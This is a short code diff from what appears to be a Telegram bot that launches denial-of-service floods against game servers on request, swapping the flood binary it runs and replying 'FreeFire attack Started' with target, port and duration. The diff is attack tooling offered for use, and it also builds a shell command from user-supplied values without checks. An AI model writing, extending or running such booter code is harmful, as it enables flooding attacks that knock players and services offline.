@@ -72,7 +72,7 @@ def handle_ffindia(message):
                 response = "❌ Error: Time interval must be less than or equal to 900 seconds."
             else:
                 log_command(user_id, target, port, time)
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./packet_sender {target} {port} {time}"
                 
                 # Updated reply format for successful attack start
                 bot.reply_to(message, f"✅ FreeFire attack Started Now ping 🛜999+\nTarget: {target}\nPort: {port}\nTime: {time} seconds\nCredit: @raj_magic")
